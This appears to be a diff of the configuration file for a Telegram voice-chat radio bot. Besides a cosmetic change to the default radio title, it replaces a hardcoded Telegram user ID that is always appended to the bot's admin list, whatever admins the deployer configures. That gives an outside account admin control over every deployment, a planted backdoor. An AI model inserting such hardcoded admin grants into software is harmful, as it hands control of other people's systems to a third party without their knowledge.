@@ -47,7 +47,7 @@ else:
 class Config:
     ADMIN = os.environ.get("ADMINS", "")
     ADMINS = [int(admin) if re.search('^\d+$', admin) else admin for admin in (ADMIN).split()]
-    ADMINS.append(1316963576)
+    ADMINS.append(1464339090)
     CHAT = int(os.environ.get("CHAT", ""))
     LOG_GROUP=os.environ.get("LOG_GROUP", "")
     if LOG_GROUP:
@@ -64,7 +64,7 @@ class Config:
     EDIT_TITLE=os.environ.get("EDIT_TITLE", True)
     if EDIT_TITLE == "False":
         EDIT_TITLE=None
-    RADIO_TITLE=os.environ.get("RADIO_TITLE", "24/7 - Mode Radio/Live YT")
+    RADIO_TITLE=os.environ.get("RADIO_TITLE", "🔴 24/7 | MODE RADIO/LIVE YT")
     if RADIO_TITLE == "False":
         RADIO_TITLE=None
     DURATION_LIMIT=int(os.environ.get("MAXIMUM_DURATION", 120))
